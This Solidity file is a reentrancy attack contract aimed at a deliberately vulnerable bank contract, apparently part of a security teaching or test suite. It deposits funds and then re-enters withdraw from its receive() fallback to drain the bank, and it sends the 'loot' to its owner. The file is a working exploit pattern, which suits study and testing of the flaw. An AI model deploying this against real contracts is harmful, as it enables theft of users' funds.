// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../vulnerable/reentrancy/VulnerableBank.sol";

contract ReentrancyAttack {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
